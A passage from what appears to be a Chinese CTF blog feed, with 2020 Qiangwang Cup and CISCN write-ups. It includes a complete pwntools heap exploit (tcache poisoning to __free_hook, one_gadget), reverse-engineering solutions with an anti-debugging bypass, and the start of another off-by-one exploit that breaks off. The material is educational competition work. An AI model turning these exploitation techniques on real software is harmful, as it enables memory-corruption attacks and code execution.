rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80988738</a></p><p>可以发现，在调用opendir和readdir后，文件名是存在于内存中的。然后因为程序的写法，会直接输出一下<code>.</code>的文件名，再次调用会输出<code>..</code>的文件名，也是<code>0x13</code>的偏移处。那么想办法溢出修改这附近的内存，在打印文件名的时候，把libc地址也给印出来。</p><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>先申请8个堆，然后释放完，让其存在一个在unsortbin的chunk，且留出一个准备上溢出攻击的chunk</li><li>openfile一下，在heap上申请一个巨大的chunk</li><li>上溢出攻击，把加入unsortbin的chunk的size给修改大一点,覆盖到上面那个巨大的chunk，且这个巨大堆的next chunk的prev size 要填上合适的大小，绕过对unsortbin 的检查。</li><li>close一下，会在刚刚巨大的chunk中留下dirent结构体，其中会包含filename</li><li>申请堆到<code>..</code>这个文件名的附近，因为是unsortbin，会在其下面留下libc地址，准备泄漏（这个要注意，尽量不要破坏dirent结构体的数据，破坏后容易无法输出filename）</li><li>上溢攻击<code>..</code>的文件名，给其修改其他合适的名字，泄漏出libc地址</li><li>剩下的就简单了，上溢攻击tcache chain，修改为free hook</li><li>攻击free hook 为one gadget</li></ul><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,offset,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'set'</span>,str(offset))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">openfile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">closefile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'5'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x18</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)openfile()add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)free(<span class="hljs-number">7</span>)data = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x8040</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>)edit(<span class="hljs-number">8</span>,<span class="hljs-number">-0x120</span>,<span class="hljs-number">0x100</span>,data)data = p64(<span class="hljs-number">0x8170</span>) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x30</span>,<span class="hljs-number">0x18</span>,data)closefile()add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)data = p64(<span class="hljs-number">0x121111111111</span>)[:<span class="hljs-number">6</span>]print(data)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)closefile()ru(<span class="hljs-string">'\x12'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">0x000000000000</span>)[:<span class="hljs-number">6</span>]edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseone = <span class="hljs-number">0x4f322</span> + libc_basedata = <span class="hljs-string">'1'</span> * <span class="hljs-number">8</span>edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x82a0</span>,<span class="hljs-number">8</span>,p64(free_hook))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x100</span>)edit(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(one))free(<span class="hljs-number">4</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;强网杯2020-部分题目&quot;&gt;&lt;a href=&quot;#强网杯2020-部分题目&quot; class=&quot;headerlink&quot; title=&quot;强网杯2020 部分题目&quot;&gt;&lt;/a&gt;强网杯2020 部分题目&lt;/h1&gt;&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#ba
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2020初赛部分题目</title>
    <link href="http://chumen77.xyz/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/20/ciscn 2020初赛部分题目/</id>
    <published>2020-08-20T15:03:02.238Z</published>
    <updated>2020-09-24T02:19:08.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020初赛部分题目"><a href="#ciscn-2020初赛部分题目" class="headerlink" title="ciscn  2020初赛部分题目"></a>ciscn  2020初赛部分题目</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>￼<br>看起来像是非齐次线性方程，那就是就是一个解方程:</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> npa = np.array([[<span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">6</span>,<span class="hljs-number">34</span>,<span class="hljs-number">58</span>,<span class="hljs-number">36</span>,<span class="hljs-number">1</span>],            [<span class="hljs-number">83</span>,<span class="hljs-number">85</span>,<span class="hljs-number">12</span>,<span class="hljs-number">73</span>,<span class="hljs-number">27</span>,<span class="hljs-number">96</span>,<span class="hljs-number">52</span>],            [<span class="hljs-number">78</span>,<span class="hljs-number">53</span>,<span class="hljs-number">24</span>,<span class="hljs-number">36</span>,<span class="hljs-number">86</span>,<span class="hljs-number">25</span>,<span class="hljs-number">46</span>],            [<span class="hljs-number">39</span>,<span class="hljs-number">78</span>,<span class="hljs-number">52</span>,<span class="hljs-number">9</span>,<span class="hljs-number">62</span>,<span class="hljs-number">37</span>,<span class="hljs-number">84</span>],            [<span class="hljs-number">23</span>,<span class="hljs-number">6</span>,<span class="hljs-number">14</span>,<span class="hljs-number">74</span>,<span class="hljs-number">48</span>,<span class="hljs-number">12</span>,<span class="hljs-number">83</span>],            [<span class="hljs-number">27</span>,<span class="hljs-number">85</span>,<span class="hljs-number">92</span>,<span class="hljs-number">42</span>,<span class="hljs-number">48</span>,<span class="hljs-number">15</span>,<span class="hljs-number">72</span>],            [<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>,<span class="hljs-number">68</span>]])b = np.array([[<span class="hljs-number">20247</span>],[<span class="hljs-number">40182</span>],[<span class="hljs-number">36315</span>],[<span class="hljs-number">36518</span>],[<span class="hljs-number">26921</span>],[<span class="hljs-number">39185</span>],[<span class="hljs-number">16546</span>]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12094</span>],[<span class="hljs-number">25270</span>],[<span class="hljs-number">19330</span>],[<span class="hljs-number">18540</span>],[<span class="hljs-number">16386</span>],[<span class="hljs-number">21207</span>],[<span class="hljs-number">11759</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10460</span>],[<span class="hljs-number">25613</span>],[<span class="hljs-number">21135</span>],[<span class="hljs-number">24891</span>],[<span class="hljs-number">18305</span>],[<span class="hljs-number">27415</span>],[<span class="hljs-number">12855</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10899</span>],[<span class="hljs-number">24927</span>],[<span class="hljs-number">20670</span>],[<span class="hljs-number">22926</span>],[<span class="hljs-number">18006</span>],[<span class="hljs-number">23345</span>],[<span class="hljs-number">12602</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12304</span>],[<span class="hljs-number">26622</span>],[<span class="hljs-number">19807</span>],[<span class="hljs-number">22747</span>],[<span class="hljs-number">14233</span>],[<span class="hljs-number">24736</span>],[<span class="hljs-number">10064</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">14169</span>],[<span class="hljs-number">35155</span>],[<span class="hljs-number">28962</span>],[<span class="hljs-number">33273</span>],[<span class="hljs-number">21796</span>],[<span class="hljs-number">35185</span>],[<span class="hljs-number">14877</span>]])x = np.linalg.solve(a, b)result += x.tolist()flag=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> i:        flag+=chr(int(f+<span class="hljs-number">0.5</span>))print(flag)</code></pre></div><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>主程序很简单，要求输入42位的flag。</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>这里开始开多线程。</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>这里面分别有一个反调试。用的IsDebuggerPresent。<br>￼￼￼￼￼￼￼￼<br>还有对你输入的东西进行处理，处理完以后与</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">402150</span> key             db <span class="hljs-number">0</span>DDh,<span class="hljs-number">5</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">1</span>Dh,<span class="hljs-number">20</span>h,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">91</span>h,<span class="hljs-number">2</span> dup(<span class="hljs-number">90</span>h),<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                                         ; DATA XREF: main1+<span class="hljs-number">96</span>↑r.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">92</span>h,<span class="hljs-number">0</span>DEh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">11</span>h,<span class="hljs-number">0</span>D1h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">51</span>h,<span class="hljs-number">11</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">51</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">2</span> dup(<span class="hljs-number">5</span>Dh),<span class="hljs-number">11</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">90</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">91</span>h,<span class="hljs-number">92</span>h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">9</span>Fh</code></pre></div><p>这42个数据进行对比。</p><p>那么思路就是过了反调试，定位关键处理输入的代码处，进行确定其是怎么操作数据的，但是看了一会没有找到，就开始想办法寻找字符映射来碰撞flag。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>然后进行一位位替换，获得flag：</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><p>主程序很简单，要求输入42位的flag。</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>开始新的线程：</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>这有一个反调试。用的IsDebuggerPresent，过的办法很简单，在x64dbg中在进入IsDebuggerPresent时，输入dbh，隐藏调试器即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>测试在这里dbh即可。<br>￼￼￼￼￼￼￼￼<br>还有对你的input进行处理，处理完以后与<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>这42个数据进行对比。</p><p>先过了反调试，定位关键处理输入的代码处（0x401223），进行确定其是怎么操作数据的，看了一会发现没有如此简单，但是发现你输入特定字符，经过程序处理出来的都是一样的:</p><p>随意输入<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>可以打印字符不算多，这就可以可以建立一个映射表：<br>输入<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>处理完：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>获取映射表：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span></code></pre></div><p>提取一下key：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>然后进行一位位替换，获得flag：</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>可以确定一下ida无法识别的数据段，是被花指令处理过了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>这里开始往下识别异常，在动态调试后，提取一下正确的汇编代码，根据正确的算法进行patch掉花指令。（还是注意dbh隐藏一下调试器。）</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __stdcall __<span class="hljs-function">noreturn <span class="hljs-title">sub_401120</span><span class="hljs-params">(LPVOID lpThreadParameter)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span>  CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, hHandle, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  WaitForSingleObject(hHandle, <span class="hljs-number">0xFFFFFFFF</span>);  inputs[<span class="hljs-number">0</span>] = (inputs[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">6</span>) ^ ((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">unsigned</span> __int8)inputs[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0x23</span>u;  Sleep(<span class="hljs-number">6u</span>);  v1 = *(<span class="hljs-keyword">unsigned</span> __int8 *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] += <span class="hljs-number">0x23</span>;  JUMPOUT(loc_4011EC);&#125;</code></pre></div><p>Patch 后的，勉强可以看懂。其中肯定是<code>inputs[i]</code>进行处理的，其中也有一个地方在加1。</p><div class="hljs"><pre><code class="hljs python">key = [    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,     <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    key[i] -= <span class="hljs-number">0x23</span>    key[i] &amp;= <span class="hljs-number">0xff</span> <span class="hljs-comment">#有可能运算后会小于0的，所以给处理一下</span>    key[i] ^= <span class="hljs-number">0x23</span>    key[i] = ((key[i] &gt;&gt; <span class="hljs-number">6</span>) ^ (key[i] &lt;&lt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xff</span>    flag += chr(key[i])print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>ubuntu 16，off by one，没有show函数，需要攻击stdout泄漏libc地址。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>用off by one，构造出chunk overlapping ,并且想办法释放堆块，让<code>main_arena_</code>落在fastbin中</li><li>修改这个<code>main_arena_</code>的最后2个字节，让其指向<code>stdout</code>附近带有<code>0x7f</code>的地址（属于0x70的fastbin堆块）</li><li>使用chunk overlapping ，来修改空闲的fastbin chain，使其中一个指向这个带有<code>main_arena</code>的堆块，进行fastbin attack，修改到stdout处的内容，leak libc</li><li>重复以上的步骤，构造一个堆块到<code>malloc_hook</code>处，写上one gadget 即可。</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'101.200.53.148'</span>,<span class="hljs-number">34521</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span 